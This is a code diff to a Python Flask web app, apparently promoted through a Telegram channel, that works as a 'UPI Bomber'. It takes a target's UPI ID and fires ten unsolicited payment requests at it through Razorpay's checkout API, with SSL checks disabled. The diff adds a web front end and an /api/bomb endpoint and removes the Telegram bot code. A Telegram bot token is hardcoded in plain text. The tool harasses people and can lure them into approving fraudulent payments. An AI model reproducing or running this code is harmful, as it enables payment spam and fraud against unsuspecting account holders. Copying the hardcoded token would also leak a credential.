@@ -1,3 +1,4 @@
+
 import os
 import logging
 import requests
@@ -5,221 +6,29 @@ import json
 import urllib.parse
 import re
 import time
-import threading
-from flask import Flask, render_template, request, jsonify
-from flask_cors import CORS
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
-from telegram.constants import ParseMode
-from telegram.request import HTTPXRequest
-import urllib3
-
-# Disable SSL warnings
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-
-# Configuration - CHANGE THESE
-TOKEN = "8671717333:AAH0qX8O6Bg-7NLv9HUWLvsVrMB_s8dJI28"
-CHANNEL_USERNAME = "hemantscripts"  # Your channel
+from flask import Flask, request, jsonify
 
 app = Flask(__name__)
-app.secret_key = os.urandom(24)
-CORS(app)
 
-# Logging
-logging.basicConfig(
-    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
-    level=logging.INFO
-)
-logger = logging.getLogger(__name__)
+# Configuration
+TOKEN = "8671717333:AAH0qX8O6Bg-7NLv9HUWLvsVrMB_s8dJI28"
+CHANNEL_USERNAME = "hemantscripts"
 
-# ---------- TELEGRAM BOT HANDLERS ----------
-def is_user_in_channel(user_id, context):
-    """Check if user is a member of the channel"""
-    try:
-        chat_member = context.bot.get_chat_member(f"@{CHANNEL_USERNAME}", user_id)
-        return chat_member.status in ['member', 'administrator', 'creator']
-    except Exception as e:
-        logger.error(f"Error checking channel membership: {e}")
-        return False
+# Disable SSL warnings
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    user_name = update.effective_user.first_name or "User"
-    
-    if not is_user_in_channel(user_id, context):
-        keyboard = [
-            [InlineKeyboardButton("📢 Join @hemantscripts", url=f"https://t.me/{CHANNEL_USERNAME}")],
-            [InlineKeyboardButton("✅ I've Joined", callback_data="check_join")]
-        ]
-        reply_markup = InlineKeyboardMarkup(keyboard)
-        
-        await update.message.reply_text(
-            f"👋 Hello {user_name}!\n\n"
-            "❌ **You must join our channel to use this bot!**\n\n"
-            "👉 Please join @hemantscripts and click 'I've Joined' button.\n\n"
-            "⚠️ **Why join?**\n"
-            "• Get latest updates\n"
-            "• Exclusive content\n"
-            "• Support & help",
-            parse_mode=ParseMode.MARKDOWN,
-            reply_markup=reply_markup
-        )
-        return
-    
-    await update.message.reply_text(
-        f"✅ Welcome {user_name}!\n\n"
-        "💳 **UPI Bomber Bot**\n\n"
-        "Send me any UPI ID (e.g., example@upi) and I'll send 10 payment requests!\n\n"
-        "⚡ **Features:**\n"
-        "• 10 requests per UPI\n"
-        "• Fast & reliable\n"
-        "• 24/7 active\n\n"
-        "⚠️ Use responsibly!",
-        parse_mode=ParseMode.MARKDOWN
-    )
-
-async def check_join_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    
-    user_id = update.effective_user.id
-    user_name = update.effective_user.first_name or "User"
-    
-    if is_user_in_channel(user_id, context):
-        await query.edit_message_text(
-            f"✅ **Awesome {user_name}!**\n\n"
-            "You're now a member! 🎉\n\n"
-            "Send me any UPI ID to start bombing:\n"
-            "Example: `example@upi`",
-            parse_mode=ParseMode.MARKDOWN
-        )
-    else:
-        keyboard = [
-            [InlineKeyboardButton("📢 Join @hemantscripts", url=f"https://t.me/{CHANNEL_USERNAME}")],
-            [InlineKeyboardButton("🔄 Check Again", callback_data="check_join")]
-        ]
-        reply_markup = InlineKeyboardMarkup(keyboard)
-        
-        await query.edit_message_text(
-            f"❌ **Still not a member!**\n\n"
-            "Please join @hemantscripts and click 'Check Again' button.",
-            parse_mode=ParseMode.MARKDOWN,
-            reply_markup=reply_markup
-        )
-
-async def handle_upi(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    vpa = update.message.text.strip()
-    
-    if not is_user_in_channel(user_id, context):
-        keyboard = [
-            [InlineKeyboardButton("📢 Join @hemantscripts", url=f"https://t.me/{CHANNEL_USERNAME}")],
-            [InlineKeyboardButton("✅ I've Joined", callback_data="check_join")]
-        ]
-        reply_markup = InlineKeyboardMarkup(keyboard)
-        
-        await update.message.reply_text(
-            "❌ **Please join our channel first!**\n\n"
-            "Click the button below to join @hemantscripts:",
-            parse_mode=ParseMode.MARKDOWN,
-            reply_markup=reply_markup
-        )
-        return
-    
-    if '@' not in vpa:
-        await update.message.reply_text(
-            "❌ **Invalid UPI ID!**\n\n"
-            "Please send a valid UPI ID like:\n"
-            "• `example@upi`\n"
-            "• `example@paytm`\n"
-            "• `example@oksbi`",
-            parse_mode=ParseMode.MARKDOWN
-        )
-        return
-    
-    processing_msg = await update.message.reply_text(
-        f"🔄 **Processing UPI:** `{vpa}`\n\n"
-        "⏳ Sending 10 requests...\n"
-        "Please wait a moment!",
-        parse_mode=ParseMode.MARKDOWN
-    )
-    
-    success_count, failed_count, details = perform_upi_bombing(vpa)
-    
-    result_text = f"""
-✅ **UPI Bombing Complete!**
-
-📌 **UPI ID:** `{vpa}`
-✅ **Successful:** {success_count}
-❌ **Failed:** {failed_count}
-📊 **Total:** {success_count + failed_count}
-
-📝 **Details:**
-{details[:300]}
-
-⚠️ Use responsibly!
-🔗 Join: @{CHANNEL_USERNAME}
-"""
-    
-    await processing_msg.edit_text(
-        result_text,
-        parse_mode=ParseMode.MARKDOWN
-    )
-
-async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    help_text = """
-📖 **UPI Bomber Bot Help**
-
-**How to use:**
-1️⃣ Join @hemantscripts
-2️⃣ Send any UPI ID
-3️⃣ Bot sends 10 requests
-
-**Commands:**
-/start - Start the bot
-/help - Show this help
-/status - Check bot status
-
-**Example UPI IDs:**
-• example@upi
-• example@paytm
-• example@oksbi
-
-⚠️ **Disclaimer:**
-This bot is for educational purposes only.
-
-👑 **Channel:** @hemantscripts
-"""
-    await update.message.reply_text(help_text, parse_mode=ParseMode.MARKDOWN)
-
-async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    status_text = """
-📊 **Bot Status**
-
-🟢 **Status:** Online
-🤖 **Bot:** @UPIBomberBot
-👑 **Channel:** @hemantscripts
-📅 **Uptime:** 24/7
-⚡ **Speed:** Fast
-
-**Features:**
-✅ Channel verification
-✅ 10 requests per UPI
-✅ Instant response
-✅ Error handling
-"""
-    await update.message.reply_text(status_text, parse_mode=ParseMode.MARKDOWN)
-
+# ---------- UPI BOMBING FUNCTION ----------
 def perform_upi_bombing(vpa):
     """Perform UPI bombing"""
     success_count = 0
     failed_count = 0
     details = []
     
-    session = requests.Session()
-    session.verify = False
-    
     try:
+        session = requests.Session()
+        session.verify = False
+        
         # Get session token
         api2 = "https://api.razorpay.com/v1/checkout/public?traffic_env=production&build=8bffa280de336408f6c3cdfe8bc6ec534d4bddcc&build_v1=0474dadf8b040ee8ffbb695d41d925e50d30fc46&checkout_v2=1&new_session=1&rzp_device_id=1.d7f92c5a00a24a1ef65a96576d2cceb815b2b151.1771871727657.22192428&unified_session_id=SK304mkDOgbYu2"
         
@@ -228,12 +37,11 @@ def perform_upi_bombing(vpa):
         }
         
         response = session.get(api2, headers=headers, timeout=20)
-        token_match = re.search(r'window\.session_token="([^"]+)"', response.text)
-        if token_match:
-            token = token_match.group(1)
-            details.append("✅ Session token obtained")
+        
+        if response.status_code == 200:
+            details.append("✅ Session obtained")
         else:
-            details.append("⚠️ Using fallback session")
+            details.append("⚠️ Fallback session")
         
         # Send 10 payment requests
         for i in range(10):
@@ -258,38 +66,323 @@ def perform_upi_bombing(vpa):
                 
                 if payment_response.status_code in [200, 201, 202]:
                     success_count += 1
-                    details.append(f"✅ Request {i+1}: Success")
+                    details.append(f"✅ Req {i+1}: Success")
                 else:
                     failed_count += 1
-                    details.append(f"❌ Request {i+1}: Failed ({payment_response.status_code})")
+                    details.append(f"❌ Req {i+1}: Failed ({payment_response.status_code})")
                 
-                time.sleep(0.5)
+                time.sleep(0.3)
                 
             except Exception as e:
                 failed_count += 1
-                details.append(f"❌ Request {i+1}: Error")
+                details.append(f"❌ Req {i+1}: Error")
         
         return success_count, failed_count, "\n".join(details)
         
     except Exception as e:
         return 0, 1, f"❌ Error: {str(e)}"
 
-# ---------- FLASK WEB ROUTES ----------
+# ---------- FLASK ROUTES ----------
 @app.route('/')
 def index():
-    return render_template('index.html', channel=CHANNEL_USERNAME)
+    """Main page with embedded HTML"""
+    return f'''
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>UPI Bomber Bot</title>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+        <style>
+            * {{ margin: 0; padding: 0; box-sizing: border-box; }}
+            body {{
+                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+                min-height: 100vh;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                padding: 20px;
+            }}
+            .container {{
+                background: rgba(255,255,255,0.95);
+                border-radius: 25px;
+                padding: 40px;
+                max-width: 480px;
+                width: 100%;
+                box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            }}
+            .logo {{ text-align: center; margin-bottom: 25px; }}
+            .logo-icon {{ font-size: 50px; }}
+            .logo h1 {{
+                font-size: 28px;
+                color: #333;
+                margin-top: 8px;
+            }}
+            .logo h1 span {{
+                background: linear-gradient(135deg, #667eea, #764ba2);
+                -webkit-background-clip: text;
+                -webkit-text-fill-color: transparent;
+            }}
+            .channel-badge {{
+                background: linear-gradient(135deg, #667eea, #764ba2);
+                color: white;
+                padding: 6px 18px;
+                border-radius: 20px;
+                display: inline-block;
+                font-size: 13px;
+                font-weight: 600;
+                margin: 8px 0;
+            }}
+            .input-group {{
+                margin-bottom: 18px;
+            }}
+            .input-group input {{
+                width: 100%;
+                padding: 14px 18px;
+                border: 2px solid #e0e0e0;
+                border-radius: 12px;
+                font-size: 16px;
+                transition: all 0.3s;
+                background: #f8f9fa;
+            }}
+            .input-group input:focus {{
+                outline: none;
+                border-color: #667eea;
+                box-shadow: 0 0 0 4px rgba(102,126,234,0.15);
+                background: white;
+            }}
+            .btn-bomb {{
+                width: 100%;
+                padding: 15px;
+                background: linear-gradient(135deg, #667eea, #764ba2);
+                color: white;
+                border: none;
+                border-radius: 12px;
+                font-size: 18px;
+                font-weight: 700;
+                cursor: pointer;
+                transition: all 0.3s;
+            }}
+            .btn-bomb:hover:not(:disabled) {{
+                transform: translateY(-2px);
+                box-shadow: 0 10px 30px rgba(102,126,234,0.4);
+            }}
+            .btn-bomb:disabled {{
+                opacity: 0.6;
+                cursor: not-allowed;
+            }}
+            .result-box {{
+                margin-top: 20px;
+                padding: 18px;
+                border-radius: 12px;
+                display: none;
+            }}
+            .result-box.show {{ display: block; }}
+            .result-box.success {{
+                background: #d4edda;
+                border: 2px solid #c3e6cb;
+                color: #155724;
+            }}
+            .result-box.error {{
+                background: #f8d7da;
+                border: 2px solid #f5c6cb;
+                color: #721c24;
+            }}
+            .stats {{
+                display: flex;
+                justify-content: space-around;
+                margin: 12px 0;
+                padding: 12px;
+                background: rgba(255,255,255,0.5);
+                border-radius: 10px;
+            }}
+            .stat-item {{ text-align: center; }}
+            .stat-item .number {{
+                font-size: 28px;
+                font-weight: 800;
+            }}
+            .success-color {{ color: #28a745; }}
+            .failed-color {{ color: #dc3545; }}
+            .total-color {{ color: #667eea; }}
+            .details {{
+                max-height: 150px;
+                overflow-y: auto;
+                font-size: 12px;
+                background: rgba(255,255,255,0.5);
+                padding: 10px;
+                border-radius: 8px;
+                margin-top: 10px;
+                font-family: monospace;
+                line-height: 1.6;
+            }}
+            .channel-section {{
+                text-align: center;
+                padding: 14px;
+                background: #f0f2ff;
+                border-radius: 12px;
+                margin-top: 18px;
+                border: 2px dashed #667eea;
+            }}
+            .channel-section a {{
+                color: #667eea;
+                text-decoration: none;
+                font-weight: 700;
+                font-size: 15px;
+            }}
+            .channel-section a:hover {{ text-decoration: underline; }}
+            .footer {{
+                text-align: center;
+                margin-top: 15px;
+                font-size: 12px;
+                color: #999;
+            }}
+            .footer a {{ color: #667eea; text-decoration: none; }}
+            .loading-spinner {{
+                display: inline-block;
+                animation: spin 1s linear infinite;
+            }}
+            @keyframes spin {{
+                from {{ transform: rotate(0deg); }}
+                to {{ transform: rotate(360deg); }}
+            }}
+            .status-badge {{
+                display: inline-block;
+                padding: 3px 12px;
+                border-radius: 20px;
+                font-size: 11px;
+                font-weight: 700;
+                margin-top: 6px;
+                background: #d4edda;
+                color: #155724;
+            }}
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <div class="logo">
+                <div class="logo-icon">⚡</div>
+                <h1>UPI <span>Bomber</span></h1>
+                <div class="channel-badge"><i class="fas fa-telegram"></i> @{CHANNEL_USERNAME}</div>
+                <p style="color: #888; font-size: 14px;">💳 Send 10 payment requests instantly</p>
+            </div>
+            
+            <div class="input-group">
+                <input type="text" id="upi-input" placeholder="example@upi" autocomplete="off">
+            </div>
+            
+            <button class="btn-bomb" id="bomb-btn">
+                <i class="fas fa-rocket"></i>
+                <span id="btn-text"> Start Bombing</span>
+            </button>
+            
+            <div id="result" class="result-box">
+                <div id="result-content"></div>
+            </div>
+            
+            <div class="channel-section">
+                <i class="fas fa-telegram"></i>
+                <a href="https://t.me/{CHANNEL_USERNAME}" target="_blank">Join @{CHANNEL_USERNAME}</a>
+                <br>
+                <span class="status-badge"><i class="fas fa-circle" style="color: #28a745; font-size: 8px;"></i> Bot is Admin</span>
+            </div>
+            
+            <div class="footer">
+                Made with ❤️ | <a href="https://t.me/{CHANNEL_USERNAME}" target="_blank">@{CHANNEL_USERNAME}</a>
+            </div>
+        </div>
+        
+        <script>
+            document.getElementById('bomb-btn').addEventListener('click', async function() {{
+                const input = document.getElementById('upi-input');
+                const vpa = input.value.trim();
+                const btn = this;
+                const resultBox = document.getElementById('result');
+                const resultContent = document.getElementById('result-content');
+                
+                if (!vpa || !vpa.includes('@')) {{
+                    resultBox.className = 'result-box show error';
+                    resultContent.innerHTML = '<i class="fas fa-exclamation-circle"></i> Invalid UPI ID! Please enter valid UPI like example@upi';
+                    input.focus();
+                    return;
+                }}
+                
+                btn.disabled = true;
+                document.getElementById('btn-text').innerHTML = ' <span class="loading-spinner"><i class="fas fa-spinner"></i></span> Sending...';
+                resultBox.className = '';
+                
+                try {{
+                    const response = await fetch('/api/bomb', {{
+                        method: 'POST',
+                        headers: {{ 'Content-Type': 'application/json' }},
+                        body: JSON.stringify({{ vpa: vpa }})
+                    }});
+                    
+                    const data = await response.json();
+                    
+                    if (data.success) {{
+                        resultBox.className = 'result-box show success';
+                        resultContent.innerHTML = `
+                            <div style="text-align: center; margin-bottom: 10px;">
+                                <i class="fas fa-check-circle" style="font-size: 35px; color: #28a745;"></i>
+                                <h3 style="margin-top: 5px;">Bombing Complete!</h3>
+                                <p style="font-size: 14px;"><strong>UPI:</strong> ${{data.vpa}}</p>
+                            </div>
+                            <div class="stats">
+                                <div class="stat-item">
+                                    <div class="number success-color">${{data.success_count}}</div>
+                                    <div style="font-size: 12px;">✅ Success</div>
+                                </div>
+                                <div class="stat-item">
+                                    <div class="number failed-color">${{data.failed_count}}</div>
+                                    <div style="font-size: 12px;">❌ Failed</div>
+                                </div>
+                                <div class="stat-item">
+                                    <div class="number total-color">${{data.total}}</div>
+                                    <div style="font-size: 12px;">📊 Total</div>
+                                </div>
+                            </div>
+                            <div class="details">${{data.details.join('<br>')}}</div>
+                        `;
+                    }} else {{
+                        resultBox.className = 'result-box show error';
+                        resultContent.innerHTML = `<i class="fas fa-times-circle"></i> ${{data.message || 'Error!'}}`;
+                    }}
+                }} catch (error) {{
+                    resultBox.className = 'result-box show error';
+                    resultContent.innerHTML = '<i class="fas fa-wifi"></i> Network Error! Please try again.';
+                }} finally {{
+                    btn.disabled = false;
+                    document.getElementById('btn-text').innerHTML = ' <i class="fas fa-rocket"></i> Start Bombing';
+                }}
+            }});
+            
+            document.getElementById('upi-input').addEventListener('keypress', function(e) {{
+                if (e.key === 'Enter') document.getElementById('bomb-btn').click();
+            }});
+            
+            document.getElementById('upi-input').focus();
+        </script>
+    </body>
+    </html>
+    '''
 
 @app.route('/api/bomb', methods=['POST'])
 def bomb_api():
+    """API endpoint for bombing"""
     try:
         data = request.get_json()
+        if not data:
+            return jsonify({'success': False, 'message': 'No data provided'}), 400
+        
         vpa = data.get('vpa', '').strip()
         
         if not vpa or '@' not in vpa:
             return jsonify({
                 'success': False,
                 'message': 'Invalid UPI ID. Please enter valid UPI like example@upi'
-            })
+            }), 400
         
         success_count, failed_count, details = perform_upi_bombing(vpa)
         
@@ -306,54 +399,22 @@ def bomb_api():
         return jsonify({
             'success': False,
             'message': f'Error: {str(e)}'
-        })
+        }), 500
 
-# ---------- TELEGRAM BOT THREAD ----------
-def run_telegram_bot():
-    try:
-        request = HTTPXRequest(
-            connect_timeout=60.0,
-            read_timeout=60.0,
-            write_timeout=60.0,
-            pool_timeout=60.0,
-            connection_pool_size=8,
-            verify=False
-        )
-        
-        application = Application.builder() \
-            .token(TOKEN) \
-            .request(request) \
-            .connect_timeout(60.0) \
-            .read_timeout(60.0) \
-            .write_timeout(60.0) \
-            .build()
-        
-        application.add_handler(CommandHandler("start", start))
-        application.add_handler(CommandHandler("help", help_command))
-        application.add_handler(CommandHandler("status", status_command))
-        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_upi))
-        application.add_handler(CallbackQueryHandler(check_join_callback, pattern="check_join"))
-        
-        print("🤖 Telegram bot is running!")
-        application.run_polling(
-            allowed_updates=Update.ALL_TYPES,
-            drop_pending_updates=True,
-            timeout=60
-        )
-        
-    except Exception as e:
-        print(f"❌ Telegram bot error: {e}")
+@app.route('/health')
+def health_check():
+    """Health check endpoint"""
+    return jsonify({
+        'status': 'ok',
+        'message': 'UPI Bomber Bot is running!',
+        'channel': CHANNEL_USERNAME
+    })
 
 # ---------- MAIN ----------
 if __name__ == '__main__':
-    # Start Telegram bot in background
-    bot_thread = threading.Thread(target=run_telegram_bot, daemon=True)
-    bot_thread.start()
-    
     port = int(os.environ.get('PORT', 5000))
-    
-    print("🚀 UPI Bomber Web App Starting...")
-    print(f"🌐 Web: http://localhost:{port}")
+    print("🚀 UPI Bomber Bot Starting...")
+    print(f"🌐 http://localhost:{port}")
+    print(f"👑 Channel: @{CHANNEL_USERNAME}")
     print("-" * 40)
-    
-    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
+    app.run(host='0.0.0.0', port=port, debug=False)
